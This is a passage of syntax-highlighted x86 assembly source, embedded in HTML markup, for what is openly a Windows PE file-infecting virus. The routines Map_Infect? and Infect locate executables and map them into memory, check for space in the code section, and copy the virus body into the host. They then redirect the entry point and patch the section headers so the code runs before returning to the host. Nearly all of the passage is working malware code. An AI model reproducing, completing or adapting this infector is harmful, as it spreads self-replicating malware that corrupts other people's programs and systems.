                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseFnd</span><span class="sc4">]</span><span class="sc0">


                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc5">Delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">;restore all</span><span class="sc0">
                </span><span class="sc6">Popa</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;return to the host</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Map_Infect?</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;edx = 0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;handle template</span><span class="sc0">

        </span><span class="sc1">;push    FILE_ATTRIBUTE_NORMAL           ;attr flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">             </span><span class="sc1">;creat flags</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;security issue</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;share mode </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc1">;r\w access</span><span class="sc0">

        </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Find_data_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;file name</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;CreateFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;smaller than cmp eax,-1, je...        </span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileError</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                     </span><span class="sc1">;get edx = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CreateFileMap object</span><span class="sc0">
</span><span class="sc1">;This is what will determine how big the file is</span><span class="sc0">
</span><span class="sc1">;when this is done the file size will be changed</span><span class="sc0">
</span><span class="sc1">;and of course the date is changed</span><span class="sc0">
 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;fileMap name</span><span class="sc0">
 
 

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">Filesize</span><span class="sc4">]</span><span class="sc0">

 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;file size high not use for this</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc1">;Protection Rights R/W etc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;security attr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;File Handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CFMap</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                     </span><span class="sc1">;again zero edx</span><span class="sc0">
                                </span><span class="sc1">;why here well ecx usual contains a</span><span class="sc0">
                                </span><span class="sc1">;value like C??????? which when xchg</span><span class="sc0">
                                </span><span class="sc1">;to eax when you us cdq edx = -1 not 0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">MapHandleError</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CMHandle</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;2nd FileMapHandle</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Map the View</span><span class="sc0">
        

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;size to map if 0 whole file</span><span class="sc0">
                                        </span><span class="sc1">;in win95 its always does whole file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;where it file to start the mapping</span><span class="sc0">
                                        </span><span class="sc1">;low word</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;high word</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">    </span><span class="sc1">;Acces rights</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;Map Handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapV</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ErrorFileMap</span><span class="sc0">
 
</span><span class="sc1">;--------------------------------------------------------------------------- </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MHandle</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;3rd Address of where its mapped</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;check for the oking of it then jmp out or back to close</span><span class="sc0">
</span><span class="sc1">;then reopen</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3CH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;WHERE THE PE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NoRoom</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEHeaderSze</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; esi = first Section Entry</span><span class="sc0">

        </span><span class="sc1">;check for the section char is</span><span class="sc0">
        </span><span class="sc1">;set for code</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">     </span><span class="sc5">NoRoom</span><span class="sc0">

        </span><span class="sc1">;FindOut if there is room to expand the file</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SzeRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VAddress</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HdrSze</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ViriiSize</span><span class="sc0"> 
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">NoRoom</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Flag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Roomie</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Flag</span><span class="sc4">]</span><span class="sc0">      

        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">GoodOpenSize</span><span class="sc0">

</span><span class="sc5">Roomie</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">
       

</span><span class="sc5">NoRoom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">GoodOpenSize</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;if called close file and get ready to infect</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapV</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;UnmapViewOfFile</span><span class="sc0">

        
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
         

</span><span class="sc5">ErrorFileMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CMHandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;close file map handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseH</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;CloseHandle             ;on stack Handle to the Map object</span><span class="sc0">

        

</span><span class="sc5">MapHandleError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseH</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;file CloseHandle             ;on stack is the File open</span><span class="sc0">

         

</span><span class="sc5">FileError</span><span class="sc4">:</span><span class="sc0">
         
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Ok do the move</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PtrRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SzeRawData</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;where this section ends in the file</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">Filesize</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ViriiSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;where to move the data from</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViriiSize</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;to</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
         
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;how much we move for 800h </span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">                             </span><span class="sc1">;move backwards</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;move it</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;move forward again</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;points to PE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;entry point RVA (Eip)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">      </span><span class="sc1">;creates the push for the ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;to return to host</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PtrRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;inc    edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;update the eip address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;maybe 5 incs are better</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mole</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;restore pointer to the section entries</span><span class="sc0">
        

        </span><span class="sc1">;update the .code area size in the section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SzeRawData</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc5">ViriiSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SzeRawData</span><span class="sc4">]</span><span class="sc0">


        </span><span class="sc1">;update this as well be better if we check if it needed to be</span><span class="sc0">
        </span><span class="sc1">;enlarged???</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;not updating the image size since we are not</span><span class="sc0">
        </span><span class="sc1">;becoming bigger in memory aligment only file alignment</span><span class="sc0">
        </span><span class="sc1">;in the header PE</span><span class="sc0">
        </span><span class="sc1">;add     dword ptr [edx + ebx + ImageSze],ViriiSize</span><span class="sc0">


        </span><span class="sc1">;Do update the code size in the Header area</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SizeOfCode</span><span class="sc4">],</span><span class="sc5">ViriiSize</span><span class="sc0">

        </span><span class="sc1">;now update the rest of the sections</span><span class="sc0">
        </span><span class="sc6">Movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumOfSects</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;update the section entries pter to raw data as long as not 0</span><span class="sc0">
</span><span class="sc5">NextSect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HdrSze</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PtrRawData</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ZPter</span><span class="sc0">  
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PtrRawData</span><span class="sc4">],</span><span class="sc5">ViriiSize</span><span class="sc0">
</span><span class="sc5">ZPter</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">NextSect</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Used For GetAddie</span><span class="sc0">
</span><span class="sc5">K32</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BASE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">K32</span><span class="sc0">   </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
